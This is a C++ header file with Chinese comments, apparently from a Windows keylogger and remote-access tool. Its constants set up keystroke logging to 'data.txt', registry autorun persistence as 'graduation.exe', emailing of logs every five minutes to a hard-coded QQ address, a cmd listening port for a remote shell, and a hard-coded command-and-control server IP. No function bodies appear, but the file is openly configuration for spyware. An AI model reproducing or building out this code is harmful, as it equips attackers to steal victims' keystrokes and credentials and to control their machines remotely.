// stdafx.h : 标准系统包含文件的包含文件，
// 或是经常使用但不常更改的
// 特定于项目的包含文件
//

#pragma once
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN  
#include "targetver.h"
           // 从 Windows 头中排除极少使用的资料
// Windows 头文件: 
#include <winsock2.h>
#include <windows.h>
#include <objbase.h>
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib, "ole32.lib")

// C 运行时头文件
#include <stdlib.h>
#include <malloc.h>
#include <memory.h>
#include <tchar.h>
#include <iostream>
#include <fstream>
#include <time.h>
#include <vector>
#include <string>

using namespace std;



#include "base64.h"
#include "CSmtp.h"


#define BUFSIZE		1024				// 缓冲区大小
#define KEYFILE		L"data.txt"			// 键盘记录文件名
#define KEYFILEA	"data.txt"			// 键盘记录文件名
#define TARGETFKEY	L"graduation"		// 注册表注册键值
#define TARGETFILE	L"\\graduation.exe"	// 注册表注册文件名
#define EMAILTIME	300000 				// 发送邮件间隔(毫秒)
#define CMDPORT		2333				// cmd监听端口
#define EMAILRECV	"898141731@qq.com"	// 邮件接受地址
#define CANDCSERVERIP		"123.207.123.58"	// c&c server port

